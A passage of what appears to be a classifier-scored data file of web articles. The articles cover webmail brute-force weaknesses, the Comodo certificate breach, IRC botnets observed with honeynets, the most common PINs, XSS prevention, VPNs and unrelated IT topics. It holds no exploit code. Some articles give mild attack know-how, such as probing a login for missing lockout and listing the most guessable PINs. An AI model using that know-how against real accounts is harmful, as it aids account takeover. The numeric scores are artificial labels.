Services. Low-Literacy Web Search A form of the Web for people who can’t read aims to help poor countries Source: “Spoken Web: Creation, Navigation and Searching of Voicesites” Sheetal Agarwal et al. 2011 International Conference on Intelligent User Interfaces (IUI), February 13-16, 2011, Palo Alto, California Results: A search engine developed by IBM researchers makes it possible to find and access information on a spoken version of the World Wide Web. A test of the interface by 40 farmers in the Indian state of Gujarat showed that it was easy to use. Why it matters: More than one billion people worldwide are illiterate, most of them in poor nations. This poses a more fundamental barrier to Web use than the cost of computers and network access. For four years, a team at IBM Research India has operated a system called the Spoken Web that uses telephone numbers in place of Web addresses so that users can dial in to “upload” or listen to spoken information. Several thousand people worldwide use the service to share information such as local crop prices. However, until now there hasn’t been an efficient way to search and sort through that information. Methods: IBM’s search engine relies on speech recognition to understand the word a person is searching for—a pesticide name, for example—and to find mentions of that word on the Spoken Web. Like a conventional search engine, it can rapidly generate a list of many results, but a user cannot skim the list to choose the best result, as is possible on the text Web. Instead, the system tells the user how many results it found and suggests ways to filter that list—for example, by the name of the person who recorded a particular piece of information. This step is repeated until there are five or fewer results. That short list is read out to the user, who chooses which result to “browse” to. Next Steps: The researchers plan to roll out the system to all users of the Spoken Web. They are also working to improve the quality of the speech recognition software involved. Most access to the Spoken Web is in Indian languages that makers of such software have not focused on before.",
        "prob": "tensor([[2.0754e-06, 1.0000e+00]])"
    },
    {
        "text": "If you have an account on Hotmail, Yahoo!, or Excite, it's vulnerable to hackers. [And yet, a few years later, Winkler says you have absolutely nothing to worry about from hackers.] Free email services are a common feature on portal sites, but some of them have serious security vulnerabilities-- specifically, Yahoo! Mail, Excite Mail, and Hotmail First, these three services allow an unlimited number of log-on attempts. This means that malicious Internet users can perform password guessing and \"brute force\" password attacks against accounts on those systems. (After three failed log-in attempts, Yahoo! does ask the supposed user if they require help. However, additional log-in attempts are not prevented.) Second, the user is not notified when a number of failed log-in attempts have occurred. If a password attack had been attempted against a user account, the user has no way of knowing. These vulnerabilities affect a lot of Internet surfers. Free email services are extremely popular as a Web-based alternative to regular Internet service provider accounts. The ability to access mail from any Web browser and a certain level of Internet anonymity are great advantages that these accounts offer. Security, however, is a distinct disadvantage. The problems probably are not limited to Yahoo!, Excite, and Hotmail. To test whether a particulare site is vulnerable to a brute-force attack, simply try entering incorrect passwords. If the system allows more than ten invalid password entries without locking out the account, then it probably allows an unlimited number of password-cracking attempts. [Probably? In his vast years of pen-testing, he hasn't run into a single case of an application or service being vulnerable to brute forcing weaknesses?] Password crackers attempt to obtain an account's password by exhaustively guessing word and number combinations. For example, an attacker may use a dictionary as the source of words. More sophisticated password crackers will use word-and-number combinations, such as star99. The most time-consuming technique is to try every possible combination of letters, numbers, and special characters. Such attacks can easily be automated. Password cracking is an extremely common hacker technique. [Password Cracking is not the same as remotely brute force attacking an application like Yahoo or Hotmail. Very few hackers rely on brute forcing as it takes an incredibly long time to complete, regardless of resources. Password cracking relies on having a hashed value of the password and then exhausting all possible combinations.] To prevent brute-force attacks, a security function should lock an account after an excessive number of failed log-in attempts, typically three to five. Once an account is locked, the user should be emailed about the failed log-in attempts and told to contact the system administrators, who will verify the user's identity. While this would cause a temporary interruption of service, it would prevent the account from being compromised. This is a basic security practice that is built into most computer operating systems. Admittedly, these vulnerabilities are extremely basic. I was not expecting them to exist on all the systems I examined. I take their presence as an indication that security was not a crucial step in designing these systems. While the sites all state that users should choose their passwords well, they do not account for attacks that can compromise even the best passwords. This leaves users, who number in the thousands or even hundreds of thousands (industry numbers measure accounts, not the number of users), vulnerable to someone with even trivial programming and hacking skills. While no attacks have been reported, it is likely that they were attempted. It is also a given that they will be attempted and successful unless action is taken. I contacted Yahoo! and Excite press liaisons about this issue and received no official reply. Hotmail could not be reached by telephone, and email messages to its technical support groups were not returned. What You Can Do Users can't currently do much to prevent their accounts from being compromised. However, until the services redesign their log-in process, surfers should be aware that an attacker may be able to access email messages and other information stored on the system. Attackers may also be able to assume your identity online. Accordingly, you should delete all sensitive messages and not use the accounts to receive sensitive messages. The best thing you can do is contact your service, let it know how important security is to you, and tell it that you expect it to correct this problem. You can also recommend that it implement the secure socket layer (SSL) protocol for log ins and accessing your information. SSL encrypts the data that you send and receive from a website and has no discernible effect on your system. This protects your information from being read by people using sniffers to read information on the Internet as it is being sent. [User's can do one thing that is immensely helpful actually; pick a strong password that is not likely to be brute forced. You know, like you recommend shortly after saying user's can't do much. Further, SSL does not prevent the attacks described in this article.] Picking a Good Password Although no one is exempt from a brute-force attack, taking a few precautions can make it significantly harder for others to guess your password. Many people pick passwords that they can easily remember. Unfortunately, that can translate into being easily guessed if someone has minimal knowledge about you. When you choose a password, make sure that it is unusual and not based on personal information or the website itself. For example, I'd imagine that hundreds of people have some variation of the word Yahoo for logging into Yahoo! Mail. One scary aspect of free email accounts is the measures put in place to help users remember their passwords. Most Web portals realize that their visitors subscribe to many portals or visit the site infrequently, and they have a feature to help people who have forgotten their passwords. Basically, the service allows you to create clues that will remind you of your password. Users can even use biographical information for a password. For example, the system will ask you what city you were born in. If you answer the question correctly, the service allows you to change your password. How hard is it to figure out where someone was born, or the name of their dog? In many cases, people might give this information out online in the course of casual exchanges of information. In response to my recent article on You've Got Mail, a woman described her experience being stalked by a former acquaintance. She said he was a brilliant hacker because he broke into her email account. When I asked her if her stalker could have gained enough information to guess her password or access question, she indicated that it would have been easy for him to know the answer to the question. My recommendation is that you think of an unusual and memorable answer for a typical question. Let's say you chose the question \"What city were you born in?\" Answer with the state as opposed to the city. Only you would know to try this unique answering approach. Finally, when you send out email, try not to divulge private information. If you use a signature file at the end of your email message, remember not to include personal information.",
        "prob": "tensor([[2.1123e-06, 1.0000e+00]])"
    },
    {
        "text": "Most of you have probably never heard of Comodo, yet this medium-sized security company is directly responsible for last week’s Apple security updates for Mac OS X and iOS. In fact, Comodo is responsible for security updates issued for every major Web browser and consumer operating system over the past few weeks. How does one relatively unknown security company trigger a rash of updates in so many different products? The answer reveals more about flaws in the chain of trust of the Internet than any particular product weaknesses. Among other aspects of their business, Comodo is a provider of the digital certificates that power the encrypted SSL/TLS (generally shortened to just SSL) connections we use to protect our communications over the Internet. Whenever you see the little lock icon in the corner of your browser you are using SSL. It means your connection is encrypted, and that, supposedly, the Web site you are visiting really is what it says it is. This technology is used to secure your connections to everything from MobileMe to your bank. SSL is also used to protect other connections and protocols — including secure email and certain VPNs. SSL relies on digital certificates — special files that use different aspects of cryptography, including cryptographic signatures — to build a chain of trust. Certificates are used to sign other certificates in a highly secure fashion that identifies every member of the entire chain, allowing your computer to decide who to trust. These chains always lead back to a root certificate authority (CA). All Web browsers, and most operating systems, include the public certificates for CAs trusted by the browser or OS manufacturer, which enables your computer to know who to trust without you having to make the decision yourself. Normally this system works well. Our banks and other online providers purchase SSL certificates from the CAs, which validate the identity of the company and issue the certificate (a file) signed by the CA. The customer company then installs that file on their Web server to enable secure connections. People who don’t want to pay for a signed certificate (which can be expensive) can generate their own, but since such self-signed certificates aren’t signed by a root CA, anyone visiting the site will see a warning from their browser and have to make a manual exception to accept it. (Very large companies often set up their own CA and install their certificate on employee systems to skip this warning). But there are three cases where the system can break down. In the first, someone creates a fake certificate with the name of a real site and tricks the user into accepting it. The second problem is if the certificate authority issues a certificate for the wrong company. We’ve seen this happen a few times for companies like Microsoft, and the Electronic Frontier Foundation’s SSL Observatory project, which tracks the over 650 CAs, found numerous certificates issued for names like “localhost” and “exchange” that could be used by an attacker in what’s called a “man in the middle attack.” It’s also suspected that less-than-friendly foreign governments issue certificates for known sites to intercept citizen and visitor traffic. The third and final case is what Comodo experienced on 15 March 2011. An attacker, believed to be a student from Iran, compromised a Comodo reseller and issued valid certificates for seven major domains including Microsoft, Yahoo, Skype, and Mozilla. Comodo responded immediately, adding those certificates to its revocation list, and Mozilla and Microsoft released updates for Firefox and Windows on 22 March and 23 March 2011. Technically, all browsers and operating systems will check for revoked certificates, but since this activity can be blocked (and is often disabled), the only certain way to remove the certificates is by blacklisting them using software updates. Apple followed with their updates on 15 April 2011 (see below), and rolled in some additional small changes. As well as SSL works, incidents like this highlight the weaknesses in the system (covered in depth in this excellent Economist article by our own Glenn Fleishman). With so many certificate authorities, including some with poor business processes, it is nearly impossible to assure that our chain of trust is actually trustworthy. While this shouldn’t change your online practices today, it’s worth understanding the system and keeping a skeptical eye in case you notice something unusual. Meanwhile, here’s additional information about Apple’s updates. iOS 4.3.2 -- The most significant of the updates, iOS 4.3.2 goes beyond the security problems to fix an issue that occasionally caused blank or frozen video during a FaceTime call, and also addresses a problem that prevented some international users from connecting to 3G networks on the 3G iPad. On the security side, along with blacklisting the spurious updates, iOS 4.3.2 includes fixes for a problem with library randomization, a pair of WebKit vulnerabilities, and a Quick Look vulnerability. Security Update 2011-002 -- This update, available for Mac OS X 10.6.7 Snow Leopard (4.43 MB), 10.5.8 Leopard (241.35 MB), and 10.5.8 Leopard Server (473.19 MB), includes only the fix necessary to blacklist the spurious certificates. iOS 4.2.7 for iPhone (CDMA) -- This update, available only via iTunes, updates iOS 4.2.5 or 4.2.6 running on the CDMA-based Verizon iPhone 4 to address not just the spurious certificates, but also iOS 4.3.2’s WebKit and Quick Look vulnerabilities. Safari 5.0.5 -- As you might expect, Safari 5.0.5 mimics the changes in iOS, blacklisting the spurious certificates and rolling in the WebKit fixes, which presumably also patch WebKit for all other applications that use it (ranging from iTunes to Google Chrome). Safari 5.0.5 requires either Mac OS X 10.5.8 or Mac OS X 10.6.5 or later and is a 46.83 MB download.",
        "prob": "tensor([[2.0960e-06, 1.0000e+00]])"
    },
    {
        "text": "What's the difference between stealing a CD from a music store and ripping off music online? The music industry and law enforcers say that there is none: Theft is theft, whether it's physical or digital. College students participating in a newly published study, however, said that while they were unlikely to shoplift and viewed that behavior as immoral, they were not exactly motivated to follow the laws governing digital music piracy -- a finding that underscores the difficulties of enforcing such laws and to find new ways to discourage the theft of all types of digital content. In the study by University of Nebraska-Lincoln researchers, nearly 200 undergraduates were asked to react to a hypothetical fellow student either shoplifting a CD or illegally downloading one. Students who reacted to the shoplifting scenario endorsed various motivations to obey the law -- morality, influence from family and friends, fear of getting caught and an inherent obligation to follow the law -- significantly more than those reacting to the downloading scenario. \"We examined theoretical explanations for law-abiding behavior that have been traditionally used to account for compliance, and found weaker support for these explanations when it comes to digital piracy,\" said Twila Wingrove, the study's lead author. \"The results suggest that students perceive shoplifting and digital piracy differently, despite the fact that they are both forms of theft.\" The study's data was collected in the mid-2000s, during highly publicized efforts by the music industry to deter piracy that included filing lawsuits against some offenders. In fact, fear of penalties was the traditional compliance factor that was most strongly related to participants' reporting reduced downloading behavior. Still, while hearing about the lawsuits had some effect on students' motivations to obey downloading laws, many still saw little chance of being caught and perceived that downloading and file sharing wasn't as serious as stealing music from a store. Why? The very nature of music piracy is likely the largest obstacle to curbing it, the authors say. There is no risk of physical harm to a victim and no physical object as a target -- making it easier to deduce that digital music theft is harming no one at all. Also, there is widespread social support for the behavior within the internet community and on college campuses. The attitude could bleed into other industries that have digitally downloadable content, such as motion pictures, video games and online news outlets that have recently put up paywalls, the research suggests. The study hints similar enforcement problems as the music industry's could set in. \"Interestingly, while respect for legal authorities is generally found to be significantly related to compliance with the law, this relationship did not seem to exist for college students and music. It wouldn't be a stretch to speculate that a similar disconnect might exist with regard to other digitally available forms of media, like television and movies. This is an avenue that should be explored in future research,\" she said. Vicky Weisz, co-author of the study, agreed: \"We have much to learn about the rapidly changing digital world and the views of younger generations about the legitimacy of the constraints on that world.\" A deterrence strategy with threats of penalties and fines, as the Recording Industry Association of America undertook in early 2004 with the lawsuits, may work as a short-term fix. Whether that fear of punishment can be sustained over time, however, remains to be seen. \"We studied college students who grew up with internet access at a time when the internet was considered an access point for free information and media and when there were no convenient, popular methods to pay for online content,\" Wingrove said. \"As more industries begin to restrict content and to streamline the purchase of content, perhaps these attitudes will shift and people will have lower expectations of entitlement, but that is a process that will likely happen very slowly.\" Wingrove, who is now at Appalachian State University, conducted the research while at UNL along with Angela Korpas of the Department of Psychology and Weisz, of UNL's Center on Children, Families, and the Law. The study appears in the journal Psychology, Crime and Law. AAAS and EurekAlert! are not responsible for the accuracy of news releases posted to EurekAlert! by contributing institutions or for the use of any information through the EurekAlert! system.",
        "prob": "tensor([[0.0151, 0.9849]])"
    },
    {
        "text": "I/O Virtualization: When, Not If August 05, 2010 I/O Virtualization (IOV) is an I/O card-sharing technology that lets multiple servers share multiple cards across a single, high-speed cable segment. The general purpose of IOV is to make it easier to share bandwidth among servers in a rack. The cards to be shared are placed in a gateway, and the servers connect to that gateway. Cards are typically shareable on a per-port basis. For example, a quad-port Ethernet card could be assigned to four different servers. The ports or cards can be quickly assigned and re-assigned to the connecting servers, providing some hot-swap like functionality to PCIe. IOV is still in its infancy, but it is destined to become a standard component of a data center architecture. There will be cost savings associated with IOV. For example, a single pair of cards in a server can perform multiple I/O functions and can replace several single-function cards per server. It also eliminates the need for a redundant card of each type in each server. Instead, a single card can act as a \"hot spare\" held within the I/O gateway and be assigned to the hosts if another card inside the gateway fails. Things get interesting when a single port on a card can be shared across multiple hosts. To accomplish this, it may mean adopting Single Root I/O Virtualization (SR-IOV), a specification from the PCI-SIG, the industry group that manages the PCI standard. Vendors may also create their own cards that can be shared. The result is that a 10GB Ethernet card or 16GB Fibre Channel card will be shareable across multiple servers, with each getting chunks of that bandwidth. The challenge for SR-IOV is the time it will take to come to market. Vendors that develop their own cards may have these capabilities sooner. I believe IOV becomes a \"when not if\" technology because of the value it brings to the virtualized environment. Today, an I/O card in a virtual host is managed by the hypervisor. Unless you limit your VMs per physical host to the number of physical NIC ports available on the host, the hypervisor has to create virtual NICs. As a result, the hypervisor has to be involved in each I/O to understand what VM the I/O is intended for. This consumes host resources and limits the potential of getting full bandwidth from the NIC. With IOV, the inspection process can be offloaded from the hypervisor. It allows the cards to be virtualized and present themselves to the hypervisor as individual NICs that can be hard-assigned to specific VMs, minimizing hypervisor interaction and maximizing resources. IOV will also give the IT administrator the ability to add and remove I/O resources to servers as needed, a term we call Infrastructure Bursting. With per-host virtual machine densities reaching the twenties and thirties, planning the I/O needs for those systems becomes more challenging. Predicting peak load times may be impossible. IOV lets you dynamically add I/O resources to physical hosts and VMs within them when peak times occur, and then re-assign them elsewhere when the need passes, basically bursting the infrastructure for a short time. All it takes is a spare card in the gateway to be assigned when I/O becomes an issue in a particular server. The ability to offload the virtualization task from the host and to dynamically add temporary bandwidth to a host makes IOV a compelling technology, and something that will likely become prevalent in larger data centers. The inhibitors to IOV are the connection styles and the amount of disruption, like any other infrastructure, that it may cause. We'll cover those inhibitors in a future entry. For more on IOV, see this entry.",
        "prob": "tensor([[0.0643, 0.9357]])"
    },
    {
        "text": "What risks will I run by not implementing an application-layer firewall? Am I leaving myself wide open by not using an application-layer firewall? Application-layer filtering firewalls are required to protect networks from modern attackers because attackers now focus their efforts on developing exploits against weaknesses in the services they attack. Since the application layer is the least protected layer, attackers use a variety of application-specific exploits and target the known and unknown weaknesses in server services in order to take control. For example: Stateful inspection firewalls just don't detect worms that are injected as a malicious code within the protocols, since they only look at network-layer packet headers. Worms require a deep inspection for identifying the signatures and the stream to that particular session to analyze the content. An application-layer filtering firewall is able to examine the application-layer commands and data to determine whether the content or commands being sent to a server on the corporate network fall outside the bounds of valid connection attempts. Another good example of the application layer-risk is buffer overflow attacks against server services. This is one of the most common methods attackers use to disable a network service and potentially take control of the server running the network service. For instance, to initiate an attack, the attacker can craft a packet containing oversized SMTP commands and then send them to an SMTP mail server. If the mail server implementation has a known or unknown buffer overflow weakness, the attack could disable or take over the server. An application-layer firewall is capable of filtering the SMTP traffic and blocks the buffer overflow attempt at the firewall itself, preventing the attack to get past the firewall. This was first published in November 2007",
        "prob": "tensor([[2.0334e-06, 1.0000e+00]])"
    },
    {
        "text": "These days, home PCs are a desirable target for attackers. Most of these systems run Microsoft Windows and often are not properly patched or secured behind a firewall, leaving them vulnerable to attack. In addition to these direct attacks, indirect attacks against programs the victim uses are steadily increasing. Examples of these indirect attacks include malicious HTML-files that exploit vulnerabilities in Microsoft's Internet Explorer or attacks using malware in Peer-to-Peer networks. Especially machines with broadband connection that are always on are a valuable target for attackers. As broadband connections increase, so to do the number of potential victims of attacks. Crackers benefit from this situation and use it for their own advantage. With automated techniques they scan specific network ranges of the Internet searching for vulnerable systems with known weaknesses. Attackers often target Class B networks ( /16 in CIDR notation) or smaller net-ranges. Once these attackers have compromised a machine, they install a so called IRC bot - also called zombie or drone - on it. Internet Relay Chat (IRC) is a form of real-time communication over the Internet. It is mainly designed for group (one-to-many) communication in discussion forums called channels, but also allows one-to-one communication. More information about IRC can be found on Wikipedia. We have identified many different versions of IRC-based bots (in the following we use the term bot) with varying degrees of sophistication and implemented commands, but all have something in common. The bot joins a specific IRC channel on an IRC server and waits there for further commands. This allows an attacker to remotely control this bot and use it for fun and also for profit. Attackers even go a step further and bring different bots together. Such a structure, consisting of many compromised machines which can be managed from an IRC channel, is called a botnet. IRC is not the best solution since the communication between bots and their controllers is rather bloated, a simpler communication protocol would suffice. But IRC offers several advantages: IRC Servers are freely available and are easy to set up, and many attackers have years of IRC communication experience. Due to their immense size - botnets can consist of several ten thousand compromised machines - botnets pose serious threats. Distributed denial-of-service (DDoS) attacks are one such threat. Even a relatively small botnet with only 1000 bots can cause a great deal of damage. These 1000 bots have a combined bandwidth (1000 home PCs with an average upstream of 128KBit/s can offer more than 100MBit/s) that is probably higher than the Internet connection of most corporate systems. In addition, the IP distribution of the bots makes ingress filter construction, maintenance, and deployment difficult. In addition, incident response is hampered by the large number of separate organizations involved. Another use for botnets is stealing sensitive information or identity theft: Searching some thousands home PCs for password.txt, or sniffing their traffic, can be effective. The spreading mechanisms used by bots is a leading cause for \"background noise\" on the Internet, especially on TCP ports 445 and 135. In this context, the term spreading describes the propagation methods used by the bots. These malware scan large network ranges for new vulnerable computers and infect them, thus acting similar to a worm or virus. An analysis of the traffic captured by the German Honeynet Project shows that most traffic targets the ports used for resource sharing on machines running all versions of Microsoft's Windows operating system: The traffic on these four ports cause more then 80 percent of the whole traffic captured. Further research with tools such as Nmap, Xprobe2 and p0f reveal that machines running Windows XP and 2000 represent the most affected software versions. Clearly most of the activity on the ports listed above is caused by systems with Windows XP (often running Service Pack 1), followed by systems with Windows 2000. Far behind, systems running Windows 2003 or Windows 95/98 follow. But what are the real causes of these malicious packets? Who and what is responsible for them? And can we do something to prevent them? In this paper we want to show the background of this traffic and further elaborate the causes. We show how attackers use IRC bots to control and build networks of compromised machines (botnet) to further enhance the effectiveness of their work. We use classical GenII-Honeynets with some minor modifications to learn some key information, for example the IP address of a botnet server or IRC channel name and password. This information allows us to connect to the botnet and observe all the commands issued by the attacker. At times we are even able to monitor their communication and thus learn more about their motives and social behavior. In addition, we give some statistics on the quantitative information we have learned through monitoring of more than one hundred botnets during the last few months. Several examples of captured activities by attackers substantiate our presentation. For this research, a Honeynet of only three machines was used. One dial-in host within the network of the German ISP T-Online, one dial-in within the network of the German ISP NetCologne and one machine deployed at RWTH Aachen University. The hosts in the network of the university runs an unpatched version of Windows 2000 and is located behind a Honeywall. The dial-in hosts run a newly developed software called mwcollectd2, designed to capture malware. We monitor the botnet activity with our own IRC client called drone. Both are discussed in greater detail later in this paper. Almost all Bots use a tiny collection of exploits to spread further. Since the Bots are constantly attempting to compromise more machines, they generate noticeable traffic within a network. Normally bots try to exploit well-known vulnerabilities. Beside from the ports used for resource sharing as listed above, bots often use vulnerability-specific ports. Examples of these ports include: The vulnerabilities behind some of these exploits can be found with the help of a search on Microsoft's Security bulletins (sample):",
        "prob": "tensor([[2.0366e-06, 1.0000e+00]])"
    },
    {
        "text": "The concept of virtualization has been around for some time. Virtualization is really just the abstraction of an actual entity or construct into logical representations of those entities or constructs. Most of the time, the term “virtualization” is tied to server virtualization — a technology made popular by VMware, Microsoft, Xen, etc. However, while server virtualization is the hot trend in enterprise IT, storage virtualization is making significant strides in functionality; people just do not realize it yet. Storage virtualization involves abstracting the physical data storage process to more logical constructs inside of the storage device. Let’s take a quick look at how storage virtualization is taking shape: Traditional storage: Single disk - A data consumer issues read/write requests. The disk controller either reads or writes to specific locations on disk. RAID: Multiple disk - This is one of the most widely used implementations for storage virtualization. While it may not seem like it, the data storage environment is indeed virtualized. - Multiple disks are aggregated into a storage structure to increase storage, increase resiliency, or both. - A data consumer issues read/write requests. The storage controller determines which storage devices contain the data, compute the entire request from multiple devices (potentially), and return it to the consumer. The data is no longer on a single device. LUN: Multiple logical storage devices - This takes RAID to the next level. - A group of disks are placed into an array structure. The disks are aggregated in some fashion (typically in RAID levels). However, a subset of the allocated capacity is divided and presented to a data consumer as a LUN. The LUN is a logical storage device for a consumer. Storage pooling: Spanning multiple drive array types - Multiple tiers of storage are created based on storage device profile (capacity and performance), typically a RAID group or other physical storage enclosures. - The storage device creates a higher-level structure, called a pool, of which the various performance tiers are members. The pool structure is presented to the data consumer at the LUN level. - The storage controller stores metadata about which data blocks reside in which tier, and their location inside the tier. Data migration: Moving data around - Building on top of storage pools, storage controllers (via metadata) are able to determine the data access patterns for individual blocks of data. - Frequently used data is moved to the highest performing tier of disk while less frequently accessed data is moved to the lower performing tier of disk. - This migration occurs without the knowledge of the data consumer. The consumer sees the storage as a LUN and does not know (or care) about what happens as long as the data is available. Deduplication: Sharing common data - Many data structures share the same data patterns. Microsoft Word files share the same framework across all files, regardless of content. Microsoft Windows servers all have common files. Conceptually, deduplication addresses the idea of “Why store multiple copies of the same data over and over again?” - Based on the type of algorithm, the storage device processes existing data to determine if any duplicate data exists. - In the event of duplicate data, the storage controller creates pointers to the common data. Common blocks are replaced by a pointer, and the overall storage footprint is reduced. Thin provisioning: Not allocating storage at creation time - This functionality operates under the theory that space may be allocated but never fully used, resulting in unused space that cannot be used by anyone else. - The storage controller receives a request to allocate space for a data consumer. The controller creates the basic framework that represents a LUN. However, internal to the storage device, the space is not allocated. Rather, the LUN is basically authorized to consume a specific amount of disk space. - As the disk consumer continues to use storage space, the LUN grows on the storage controller until the LUN size is completely allocated. Until the LUN is fully utilized, the unused space can be used for other purposes. - This may result in over-allocation of storage, though, and needs monitoring. Storage Virtualization Continues to Advance As you can see, from traditional file storage to thin provisioning, storage virtualization has played a major role in advancing how we use our storage infrastructure and reap the benefits from our investments. Storage virtualization techniques and technology continue to advance. Object storage, pNFS, and server virtualization functional offload will become more commonplace as new storage device models and feature sets are developed and introduced. Storage virtualization is not the process of storing virtual machine disks. Rather, it is a beast of its own, and continues to provide valuable benefits.",
        "prob": "tensor([[2.8357e-06, 1.0000e+00]])"
    },
    {
        "text": "Checking PIN passwords from databases that were released by hackers in the past, Nick Berry found that the 20 most popular ones compose more than 25 percent of all passwords in existence. By far, the most popular password is 1234. “It’s staggering how popular this password appears to be. Utterly staggering at the lack of imagination,” Berry writes. “Nearly 11 percent of the 3.4 million passwords are 1234!” The next most popular combination is 1111, clocking in at about 6 percent. Passwords made of repeating numbers like this are overwhelmingly popular. And in a real move of maturity, 6969 charts at number 10 on the list. The least commonly used password? 8068, clocking in with a frequency of 0.000744 percent. Of course, just because this is currently the least used PIN, it doesn’t mean it’s a smart idea to rush out and change your numbers to that combination. In fact, that bit of knowledge comes with a warning from Berry. “Now that we’ve learned that, historically, 8068 is (was?) the least commonly used password 4-digit PIN, please don’t go out and change yours to this!” he wrote. “Hackers can read too! They will also be promoting 8068 up their attempt trees in order to catch people who read this (or similar) articles.” By pushing a number up their \"attempt trees,\" Berry means hackers would give it more priority in the list of numbers they use to try and crack the password. What is the take-home from all of this data? For one, never use 1234 as your PIN. But more generally, if your PIN is a series of easily guessable numbers, it’s probably a bad idea to use that flimsy piece of security to protect your banking information. If your number shows up in the top 20, it might be wise to change it. Berry also chides developers who make data like this easily accessible to hackers. All of the information used in Berry’s study was found in unencrypted databases, meaning that once a developer or hacker has access to the database, no further methods are required to see any and all of the passwords available. That’s just bad security. See much, much more raw data on PIM passwords at Data Genetics.",
        "prob": "tensor([[2.0513e-06, 1.0000e+00]])"
    },
    {
        "text": "XSS Prevention in Four Simple Steps Preventing Cross Site Scripting (XSS) attacks is a daunting task for developers. In short, XSS attacks are an injection attack in which data that is structurally significant in the current context changes the intended semantics and/or functionality. While there are great resources online that walk you through prevention techniques (one of the best security resources is The Open Web Application Security Project, or OWASP, website), it’s easy to get confused when you try to implement all of the necessary safeguards. Below, I’ve outlined four simple steps that significantly lower the risk of XSS attacks against your website. By being a bit more restrictive, we can simplify our approach to preventing XSS in the most common use cases. These steps must all be implemented together, but there’s only four of them, so c’mon, you can do it Step 1: Escape Output Provided by Users If you want to include data within a page that’s been provided by users, escape the output. And, in this simplified list, we’re going to stick with one simple escape operation: HTML encode any <, >, &, ‘, “. For example, PHP provides the htmlspecialchars() function to accomplish this common task. Step 2: Always Use XHTML Read through OWASP’s XSS prevention strategies, and it becomes apparent that protecting against injection requires much more effort if you use unquoted attributes in your HTML. In contrast, in quoted attributes, escaping data becomes the same process needed to escape data for content within tags, the escape operation we already outlined above. That’s because the only troublemaker in terms of sneaking in structurally significant content within the context of a quoted attribute is the closing quote. Obviously, your markup doesn’t have to be XHTML in order to contain quoted attributes. However, shooting for and validating against XHTML makes it easy to test if all of the attributes are quoted. Step 4: URL-Encode URL Query String Parameters If user data is output within a URL parameter of a link query string, make sure to URL-encode the data. Again, using PHP as example, you can simply use the urlencode() function. Now, let’s be clear on this and work through a couple examples, as I’ve seen much confusion concerning this particular point. The following example outputs user data that must be URL-encoded because it is used as a value in the query string. Must Not URL-Encode The following example outputs the user-supplied data for the entire URL. In this case, the user data should be escaped with the standard escape function (HTML encode any <, >, &, ‘, “), not URL-encoded. URL-encoding this example would lead to malformed links. That said, these four steps provide a an approach to defending against XSS that is easily remembered and implemented, covers a broad range of typical website scenarios, and serves as a solid start for developers who are learning how to address basic security concerns.",
        "prob": "tensor([[2.8957e-05, 9.9997e-01]])"
    },
    {
        "text": "A Virtual Private Network (VPN) is a network technology that is used to link multiple computers, servers and any VPN-capable devices through private or public and secured web tunnels. VPN also make use of an encryption system in the transmission of data; hence keeping every bit of information being transmitted from one system to another as secured as possible and therefore can only be accessed by the authorized recipient/s. Using a VPN let you enhance your web browsing security by accessing information through secure VPN tunnels, bypass censorships and access online content without hassles, and change Your IP and Server for added web browsing anonymity. In reality, a Virtual Private Network is just a network of different computers, network devices or servers that are connected either through the private or the public domain using secure tunnels. This means that a VPN is not entirely different from a LAN or a WAN, but the data transmission usually happens over a secure network, immaterial of the medium of transfer. Data transfer is of paramount importance for any organization and individuals alike. In the olden days, data transfer was made through secure, storable and transportable mediums such as discs, and it usually involved a lot of risk and was considered to be time consuming. However, with access to internet, it has become possible for various organizations and companies to connect their different satellite offices together and make the process of data transfer both fast and seamless. This has allowed various companies to set up shop in different countries around the globe. This even led to a rise in the number of professionals who started working out of their homes or tiny satellite offices that were set up in convenient locations to reduce the overall costs. But fast, easy and cheap data transfer over the internet led to another issue, SECURITY. Data transfer over the internet offers the least security. Various hackers, viruses and malicious programs are constantly on the lookout for gaining access to confidential and sensitive data that will give them an opportunity for making financial gains. And leasing special lines across these distances can prove to be extremely expensive. A VPN on the other hand, allows the company to connect via the internet and use the security of secure VPN tunnels. These tunnels are basically encrypted connections created by connecting the devices through intermediary servers often hosted by VPN service providers. Large companies and Government organizations usually develop their own Virtual Private Networks to manage large projects and host the servers and experts in-house. But managing and hosting a VPN can prove to be quite expensive for smaller companies and individuals, which is why there are dedicated VPN service providers who will look after the technical aspects of managing a VPN, while the subscribers can enjoy VPN services for a small monthly subscription fee. How does VPN Work? VPN works through a complex process of traffic rerouting and encrypting. While the detailed explanation can include quite a few technical details and server information, in simpler terms, a VPN works by rerouting your traffic, which is in turn done by connecting your device first to an anonymous VPN server, before proceeding towards your intended online action path. Therefore, the primary duty of a VPN is to connect your device to a VPN server, after which, all the actions and paths will originate from the VPN server itself. To better understand the concept, you will need to know about the effects your IP on your browsing experience. Every ISP provides a dedicated, or in other cases dynamic, IP for each user. Your dedicated IP address is representative of your actual geographical location, which is the single-most factor that determines your online presence. Even if your ISP provides you with a dynamic IP, the actions performed by you on the network can be traced back to you. This data is often used by websites, Government agencies and other organizations to track your online behavior, censor internet content and outright block you from accessing any online information. By connecting using a VPN, you can entrust the VPN server to lift all the heavy load, and every action performed by you will only be tracked back to the anonymous VPN server, not your actual IP address. This is something that attracts most users to a VPN service provider, and security of online browsing is just an added bonus. Read more: List of top VPN providers What are the differences between VPN and proxy? Both of these technologies are used to change your IP address. However, they differ in operations (e.g. how they re-route network traffic and change IP addresses). Proxy server is a server that acts as a filter. When using proxy in protecting your internet activities, you have to setup first your internet browser with the correct proxy settings. This means that you can only have secured internet activities when you’re browsing through an internet browser that has proxy settings setup to it. For VPN, users simply need to install the VPN client software and that’s about it – no need to make tweaks with the internet browsers. Every time users browse the internet, they simply need to connect the VPN client app first to have safe and private internet browsing experiences. The advantage of VPN over proxy is that the former can be used for any internet-capable devices/applications while the latter only works with internet browsers. So what technology offers more secured connections? It has to be VPN, no doubt about that. Read more: Premium VPN vs Free VPN vs Free Web Proxies What are the different types of VPN protocols? There are various types of VPN protocols that people can use to have secured internet connections. Here are the most commonly used VPN protocols. • Point-to-Point Tunneling Protocol (PPTP) • Internet Protocol Security (IPSec) • Secure Socket Tunneling Protocol (SSTP) • Layer Two Tunneling Protocol (L2TP) PPTP and L2TP/IPsec are the more preferred types of protocols because they are the fastest security protocols available today. SSTP and OpenVPN are the best when it comes to security. However, more secured connections means more encryptions; therefore slowing down the connection and browsing experiences on SSTP and OpenVPN. Read more: Learn about the different VPN protocols Why use VPN? There are several benefits of using a VPN service. There isn’t any particular end user or customer specific demographic as far as VPN usage is concerned. From the very outset, VPN can be made useful for the average internet browser, and the benefits may increase from individual user to large organizations. From an everyday internet 